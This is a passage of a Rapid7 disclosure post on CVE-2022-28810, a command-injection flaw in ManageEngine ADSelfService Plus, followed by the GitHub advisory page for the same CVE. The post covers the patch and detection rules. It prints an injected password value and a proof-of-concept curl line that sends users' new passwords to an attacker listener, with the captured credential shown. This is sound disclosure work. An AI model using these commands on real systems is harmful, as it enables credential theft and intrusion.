Rapid7 MDR has observed this technique being actively leveraged in customer environments ‚Äî compromised (or default) `admin` credentials have been used to execute arbitrary OS commands in order to gain persistence on the underlying system and attempt to pivot further into the environment.

Furthermore, the ‚Äú%password%‚Äù variable was passed to the configured script without sanitization. Depending on the configured script, an attacker that is able to trigger a password reset could inject arbitrary operating system commands. For example, if the admin user configured the following script:

```
cmd.exe /c echo %username% %password% >> C:\ProgramData\something.txt

```

An attacker could inject arbitrary commands via password reset by providing a %password% like:

```
&& mkdir C:\ProgramData\helloworld && echo hi

```

Resulting in the directory ‚Äúhelloworld‚Äù being created in `C:\ProgramData\`.

![](https://blog.rapid7.com/content/images/2022/04/image2-2.png)

Finally, because %password% isn‚Äôt sanitized or obfuscated at all, the `admin` user can observe all password changes, allowing them to effectively recover valid credentials for active directory accounts. As a proof of concept for this, we used the `admin` account to configure the password reset script to exfiltrate the new password to a server in the attacker‚Äôs control:

```
cmd.exe /c curl http://10.0.0.2:1270/%userName%=%password%

```

The attacker server would receive the following on password reset:

```
albinolobster@ubuntu:~$ nc -lvnp 1270
Listening on 0.0.0.0 1270
Connection received on 10.0.0.13 62065
GET /albinolobster=sl0wrunner! HTTP/1.1
Host: 10.0.0.2:1270
User-Agent: curl/7.55.1
Accept: */*

```
## The patch

ManageEngine fixed this issue by no longer accepting scripts through the web interface. Post action scripts must now be placed on disk by a user with access to the underlying operating system. Furthermore, the script arguments are now base64 encoded. Here is an updated version of the Post Action interface.

![](https://blog.rapid7.com/content/images/2022/04/image3-1.png)
## Indicators of compromise

We encourage users of ManageEngine ADSelfService Plus to inspect the value they have configured in the Post Action fields. Using the `admin` account, you can navigate to the fields by following this pattern: `Configuration -> Self Service -> Policy Configuration -> Advanced -> Password Sync`.

We also highly encourage users to upgrade as soon as possible and to change the `admin` password.

## Disclosure timeline

**Tue, Apr 6, 2022:** Initially discovered in the wild via Rapid7 Managed Detection and Response (MDR) service

**Tue April 6, 2022:** Initial disclosure to the vendor via their [reporting portal](https://bugbounty.zoho.com/bb/info)

**Wed April 7, 2022:** Discussion with vendor about the issues, CVE assignment, and disclosure timelines

**Sat April 9, 2022:** ManageEngine [publishes](https://www.manageengine.com/products/self-service-password/kb/cve-2022-28810.html) a new version of ADSelfService Plus

**Tue Apr 12, 2022:** Disclosed to CERT/CC and NCSC

**April 14, 2022:** Rapid7 publishes their disclosure (this document)

## Rapid7 customers

[InsightVM](https://www.rapid7.com/products/insightvm/) and [Nexpose](https://www.rapid7.com/products/nexpose/) customers can assess their exposure to CVE-2022-28810 with an unauthenticated vulnerability check in the April 13, 2022 content release.

[InsightIDR‚Äôs](https://www.rapid7.com/products/insightidr/) existing detection rules (listed below) are able to identify attacks that abuse this functionality. We recommend that you review your settings for these detection rules and confirm they are turned on and set to an appropriate rule action and priority for your organization:

* Suspicious Process - Powershell Invoke-WebRequest
* Attacker Technique - Attrib Sets File Or Directory As Hidden And System
* Attacker Technique - Enumerating Domain Or Enterprise Admins With Net Command
* Suspicious Process - Zoho ManageEngine Spawns Child

We have also added the following detection rule and prioritized it as Critical:

* Attacker Technique - Hiding ScreenConnect With Attrib

Rapid7 detection logic is continuously reviewed to ensure detections are based on any observed attacker behavior seen by our Incident Response (IR), [Managed Detection and Response (MDR)](https://www.rapid7.com/services/managed-detection-and-response-mdr/), and Threat Intelligence and Detection Engineering (TIDE) teams. Through continuous collaboration and threat landscape monitoring, we ensure product coverage for the latest techniques being used by malicious actors and will make updates as necessary.

***Additional reading:***

* *[CVE-2022-24527: Microsoft Connected Cache Local Privilege Escalation (Fixed)](https://www.rapid7.com/blog/post/2022/04/12/cve-2022-24527-microsoft-connected-cache-local-privilege-escalation-fixed/)*
* *[CVE-2022-1026: Kyocera Net View Address Book Exposure](https://www.rapid7.com/blog/post/2022/03/29/cve-2022-1026-kyocera-net-view-address-book-exposure/)*
* *[Analyzing the Attack Landscape: Rapid7‚Äôs 2021 Vulnerability Intelligence Report](https://www.rapid7.com/blog/post/2022/03/28/analyzing-the-attack-landscape-rapid7s-annual-vulnerability-intelligence-report/)*
* *[CVE-2021-4191: GitLab GraphQL API User Enumeration (FIXED)](https://www.rapid7.com/blog/post/2022/03/03/cve-2021-4191-gitlab-graphql-api-user-enumeration-fixed/)*

#### NEVER MISS A BLOG

Get the latest stories, expertise, and news about security today.

Subscribe

#### POST TAGS

* [Emergent Threat Response](/blog/tag/emergent-threat-response/ "Emergent Threat Response")
* [Vulnerability Disclosure](/blog/tag/vulnerability-disclosure/ "Vulnerability Disclosure")
* [Research](/blog/tag/research/ "Research")
* [Vulnerability Management](/blog/tag/vulnerability-management/ "Vulnerability Management")

#### SHARING IS CARING

#### AUTHOR

[Jake Baines](/blog/author/jake-baines/ "Jake Baines")
[View Jake's Posts](/blog/author/jake-baines/)

![](https://blog.rapid7.com/content/images/2022/04/managengine-vuln.jpg)

## Topics

* [Metasploit
  ¬†*(662)*](/blog/tag/metasploit/)
* [Vulnerability Management
  ¬†*(365)*](/blog/tag/vulnerability-management/)
* [Research
  ¬†*(242)*](/blog/tag/research/)
* [Detection and Response
  ¬†*(207)*](/blog/tag/detection-and-response/)
* [Vulnerability Disclosure
  ¬†*(150)*](/blog/tag/vulnerability-disclosure/)
* [Emergent Threat Response
  ¬†*(144)*](/blog/tag/emergent-threat-response/)
* [Cloud Security
  ¬†*(137)*](/blog/tag/cloud-security/)
* [Security Operations
  ¬†*(21)*](/blog/tag/secops/)

## Popular Tags

* [Metasploit](/blog/tag/metasploit/)
* [Metasploit Weekly Wrapup](/blog/tag/metasploit-weekly-wrapup/)
* [Vulnerability Management](/blog/tag/vulnerability-management/)
* [Research](/blog/tag/research/)
* [Detection and Response](/blog/tag/detection-and-response/)
* [Logentries](/blog/tag/logentries/)

## Related Posts

Out With the Old, In With the New: Securely Disposing of Smart Devices

[Read More](/blog/post/2025/01/06/out-with-the-old-in-with-the-new-securely-disposing-of-smart-devices/)

2024 Threat Landscape Statistics: Ransomware Activity, Vulnerability Exploits, and Attack Trends

[Read More](/blog/post/2024/12/16/2024-threat-landscape-statistics-ransomware-activity-vulnerability-exploits-and-attack-trends/)

Modular Java Backdoor Dropped in Cleo Exploitation Campaign

[Read More](/blog/post/2024/12/11/etr-modular-java-backdoor-dropped-in-cleo-exploitation-campaign/)

Patch Tuesday - December 2024

[Read More](/blog/post/2024/12/10/patch-tuesday-december-2024/)

## Related Posts

[IoT

Out With the Old, In With the New: Securely Disposing of Smart Devices

Read Full Post](/blog/post/2025/01/06/out-with-the-old-in-with-the-new-securely-disposing-of-smart-devices/)

[Labs

2024 Threat Landscape Statistics: Ransomware Activity, Vulnerability Exploits, and Attack Trends

Read Full Post](/blog/post/2024/12/16/2024-threat-landscape-statistics-ransomware-activity-vulnerability-exploits-and-attack-trends/)

[Malware

Modular Java Backdoor Dropped in Cleo Exploitation Campaign

Read Full Post](/blog/post/2024/12/11/etr-modular-java-backdoor-dropped-in-cleo-exploitation-campaign/)

[Patch Tuesday

Patch Tuesday - December 2024

Read Full Post](/blog/post/2024/12/10/patch-tuesday-december-2024/)

[View All Posts](/blog/posts/)

Search

[BACK TO TOP
![](/includes/img/up-arrow-lightgray.png?width=1200)](#__)

[![Rapid7 logo](/includes/img/Rapid7_logo.svg?width=1200&quality=90)](/)
CUSTOMER SUPPORT
+1-866-390-8113 (Toll Free)
SALES SUPPORT
+1-866-772-7437 (Toll Free)
Need to report an Escalation or a Breach?
[Get Help](/services/incident-response-customer-escalation/)

SOLUTIONS
[The Command Platform](/platform/)
[Exposure Command](/products/command/exposure-management/)
[Managed Threat Complete](/services/managed-detection-and-response-mdr/)

SUPPORT & RESOURCES
[Product Support](https://www.rapid7.com/for-customers/)
[Resource Library](https://www.rapid7.com/resources/)
[Our Customers](https://www.rapid7.com/customers/)
[Events & Webcasts](https://www.rapid7.com/about/events-webcasts/)
[Training & Certification](https://www.rapid7.com/services/training-certification/)
[Cybersecurity Fundamentals](https://www.rapid7.com/fundamentals/)
[Vulnerability & Exploit Database](https://www.rapid7.com/db/)

ABOUT US
[Company](https://www.rapid7.com/about/company/)
[Diversity, Equity, and Inclusion](https://www.rapid7.com/about/diversity-equity-and-inclusion/)
[Leadership](https://www.rapid7.com/about/leadership/)
[News & Press Releases](https://www.rapid7.com/about/news/)
[Public Policy](https://www.rapid7.com/about/public-policy/)
[Open Source](https://www.rapid7.com/open-source/)
[Investors](https://investors.rapid7.com/overview/default.aspx)

CONNECT WITH US
[Contact](https://www.rapid7.com/contact/)
[Blog](https://www.rapid7.com/blog/)
[Support Login](https://insight.rapid7.com/login)
[Careers](https://careers.rapid7.com/careers-home)

¬© Rapid7
[Legal Terms](/legal/)
¬† | ¬† [Privacy Policy](/privacy-policy/)
¬† | ¬† [Export Notice](/export-notice/)
¬† | ¬† [Trust](/trust/)
¬† | ¬† Do Not Sell or Share My Personal Information
¬† | ¬† Cookie Preferences

Contact Us

## Submit your information and we will get in touch with you.

#### Thank you for contacting us.

##### We will be in touch shortly.

![Rapid7 logo](/includes/img/logo-black.png)

### General:

info@rapid7.com

### Sales:

+1-866-772-7437
sales@rapid7.com

### Support:

+1‚Äì866‚Äì390‚Äì8113 (toll free)
support@rapid7.com

### Incident Response:

1-844-727-4347

[More Contact Info](/contact/)

## Never miss a blog

Get the latest stories, expertise, and news about security today.

You‚Äôre almost done!
 Check your email to confirm your subscription.



=== Content from github.com_ac6ca8a6_20250108_154537.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fadvisories%2FGHSA-q392-qg7v-xvc4)

**CVE-2022-28810**

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fadvisories%2FGHSA-q392-qg7v-xvc4)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2Fadvisories%2F%3Cid%3E&source=header)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

1. [GitHub Advisory Database](/advisories)
2. [Unreviewed](/advisories?query=type%3Aunreviewed)
3. [CVE-2022-28810](/advisories/GHSA-q392-qg7v-xvc4)

## Zoho ManageEngine ADSelfService Plus before 6122 allows...

High severity

Unreviewed

Published
Apr 19, 2022
to the GitHub Advisory Database
‚Ä¢
Updated Jan 27, 2023

## Package

No package listed‚Äî
[Suggest a package](/advisories/GHSA-q392-qg7v-xvc4/improve)

## Affected versions

Unknown

## Patched versions

Unknown

## Description

Zoho ManageEngine ADSelfService Plus before 6122 allows an authenticated user to achieve remote code execution via executable CMD.EXE input in a password field, This only occurs if a certain password sync feature is enabled that uses passwords as script arguments.

### References

* <https://nvd.nist.gov/vuln/detail/CVE-2022-28810>
* <https://www.manageengine.com/products/self-service-password/kb/cve-2022-28810.html>
* [rapid7/metasploit-framework#16475](https://github.com/rapid7/metasploit-framework/pull/16475)
* <https://www.rapid7.com/blog/post/2022/04/14/cve-2022-28810-manageengine-adselfservice-plus-authenticated-command-execution-fixed/>
* <http://packetstormsecurity.com/files/166816/ManageEngine-ADSelfService-Plus-Custom-Script-Execution.html>

Published by the [National Vulnerability Database](https://nvd.nist.gov/vuln/detail/CVE-2022-28810)
Apr 18, 2022

Published to the GitHub Advisory Database
Apr 19, 2022

Last updated
Jan 27, 2023

### Severity

High

### [EPSS score](https://www.first.org/epss/user-guide)

89.397%
 (99th percentile)

### Weaknesses

[CWE-78](/advisories?query=cwe%3A78)

### CVE ID

CVE-2022-28810

### GHSA ID

GHSA-q392-qg7v-xvc4

### Source code

No known source code

Dependabot alerts are not supported on this advisory because it does not have a package from a supported ecosystem with an affected and fixed version.

[Learn more about GitHub language support](https://docs.github.com/get-started/learning-about-github/github-language-support#about-supported-languages)

 Loading

Checking history

See something to contribute?
[Suggest improvements for this vulnerability](/advisories/GHSA-q392-qg7v-xvc4/improve).

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.


